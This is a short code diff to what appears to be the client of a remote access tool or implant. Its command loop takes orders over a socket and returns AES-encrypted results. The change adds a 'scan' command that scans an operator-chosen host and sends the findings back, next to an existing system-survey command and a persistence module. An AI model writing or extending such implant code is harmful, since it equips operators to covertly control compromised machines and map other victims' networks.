@@ -15,6 +15,7 @@ from core import common
 from core import crypto
 from core import filesock
 from core import persistence
+from core import scan
 from core import survey
 from core import toolkit
 
@@ -87,6 +88,11 @@ def main():
         # run system survey
         elif cmd == 'survey':
             results = survey.run(PLAT_TYPE)
+            s.send(crypto.AES_encrypt(results, DHKEY))
+
+        # run a scan
+        elif cmd == 'scan':
+            results = scan.single_host(action)
             s.send(crypto.AES_encrypt(results, DHKEY))
 
 
